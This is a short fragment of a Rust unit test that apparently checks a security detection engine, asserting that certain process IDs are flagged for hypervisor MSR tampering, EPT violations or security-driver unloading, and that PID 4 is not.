        assert!(behaviors.iter().any(|b| b.pid == 7102 && b.detection == "Server.Hypervisor.SyscallMsrTamper"));
        assert!(!behaviors.iter().any(|b| b.pid == 4 && b.detection == "Server.Hypervisor.SyscallMsrTamper"));
        assert!(behaviors.iter().any(|b| b.pid == 7104 && b.detection == "Server.Hypervisor.SyscallMsrTamper"));
        assert!(behaviors.iter().any(|b| b.pid == 7105 && b.detection == "Server.Hypervisor.EptViolation"));
        for tamper_pid in [7106u32, 7107, 7108] {
            assert!(behaviors.iter().any(|b| b.pid == tamper_pid && b.detection == "Server.EDR.SecurityDriverUnloaded"));
        }
    }
}
